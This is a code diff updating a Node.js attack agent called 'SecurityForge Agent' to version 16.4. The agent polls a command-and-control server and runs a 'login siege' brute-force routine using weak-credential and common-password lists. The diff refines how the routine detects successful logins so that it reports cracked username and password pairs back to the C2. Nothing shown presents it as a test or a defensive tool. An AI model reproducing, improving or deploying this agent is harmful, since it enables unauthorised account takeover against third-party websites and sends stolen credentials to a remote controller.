@@ -1,5 +1,6 @@
 /**
- * SECURITYFORGE AGENT V16.3 (TRUTH SEEKER)
+ * SECURITYFORGE AGENT V16.4 (ZERO TRUST)
+ * - V16.4: Zero Trust Logic. 200 OK is FAILURE for logins unless proven otherwise.
  * - V16.3: Fixed Login False Positives (HTML Body Analysis + Error Keyword Detection)
  * - V16.1: Local IP Detection
  * - V16.0: Master Key Logic
@@ -32,11 +33,12 @@ const WEAK_CREDS = [
 const COMMON_PASSWORDS = ['123456', 'password', '12345678', 'qwerty', '123456789', '12345', '1234', '111111', '1234567', 'dragon', 'master', 'mysql', 'root123'];
 const TOP_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 465, 587, 993, 995, 3306, 3389, 5432, 6379, 8080, 8443];
 const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');  
-const ERROR_KEYWORDS = ['invalid', 'incorrect', 'fail', 'error', 'denied', 'wrong', 'try again', 'unauthorized', 'not found'];
+const ERROR_KEYWORDS = ['invalid', 'incorrect', 'fail', 'error', 'denied', 'wrong', 'try again', 'unauthorized', 'not found', 'login failed'];
+const SUCCESS_KEYWORDS = ['welcome', 'dashboard', 'success', 'account', 'profile', 'logged in', 'session'];
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V16.3 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V16.4 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -74,7 +76,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V16.3 (Truth Seeker). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V16.4 (Zero Trust). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -247,32 +249,37 @@ const startAttack = (job) => {
                  const lat = Date.now() - start;
                  jobLatencySum += lat; jobReqsForLatency++; jobMaxLatency = Math.max(jobMaxLatency, lat);
                  
-                 // V16.3 FIX: READ BODY FOR TRUTH SEEKER ANALYSIS
+                 // V16.4 FIX: ZERO TRUST LOGIN VERIFICATION
                  if (job.use_login_siege) {
                      let responseBody = '';
                      res.on('data', chunk => responseBody += chunk.toString());
                      res.on('end', () => {
                          const bodyLower = responseBody.toLowerCase();
-                         // TRUTH SEEKER LOGIC:
-                         // 1. Is there an error keyword? (invalid, incorrect, etc)
+                         
                          const hasError = ERROR_KEYWORDS.some(kw => bodyLower.includes(kw));
-                         // 2. Is there a Session Cookie?
+                         const hasSuccessKeyword = SUCCESS_KEYWORDS.some(kw => bodyLower.includes(kw));
                          const hasCookie = res.headers['set-cookie'] && res.headers['set-cookie'].some(c => !c.includes('deleted'));
-                         // 3. Is it a redirect AWAY from login?
-                         const isGoodRedirect = (res.statusCode === 301 || res.statusCode === 302) && !res.headers.location?.includes('login') && !res.headers.location?.includes('error');
+                         const isRedirect = (res.statusCode === 301 || res.statusCode === 302);
+                         const isLoginRedirect = res.headers.location?.includes('login') || res.headers.location?.includes('error');
 
-                         if (!hasError && (hasCookie || isGoodRedirect || res.statusCode === 200)) {
-                             // Only log if no explicit error found AND signs of success present
-                             // Filtering simple 200s that contain error text
-                             if (res.statusCode === 200 && hasError) {
-                                 // False positive (200 OK but says 'Invalid Password') -> Fail
-                                 jobFailed++;
-                             } else {
-                                 logToC2(`[CRITICAL] LOGIN BYPASSED: [${creds[0]} / ${creds[1]}] Status: ${res.statusCode}`);
-                                 jobSuccess++;
+                         // ZERO TRUST: 200 OK is FAILURE unless explicit success keyword present
+                         // Redirect is FAILURE if it goes back to login
+                         
+                         let isBypass = false;
+
+                         if (isRedirect && !isLoginRedirect) {
+                             isBypass = true; // Redirected to dashboard/home
+                         } else if (res.statusCode === 200) {
+                             if (!hasError && (hasSuccessKeyword || hasCookie)) {
+                                 isBypass = true; // 200 OK + "Welcome" or Cookie
                              }
+                         }
+
+                         if (isBypass) {
+                             logToC2(`[CRITICAL] LOGIN BYPASSED: [${creds[0]} / ${creds[1]}] Status: ${res.statusCode}`);
+                             jobSuccess++;
                          } else {
-                             jobFailed++;
+                             jobFailed++; // Default to failed
                          }
                      });
                  } else {
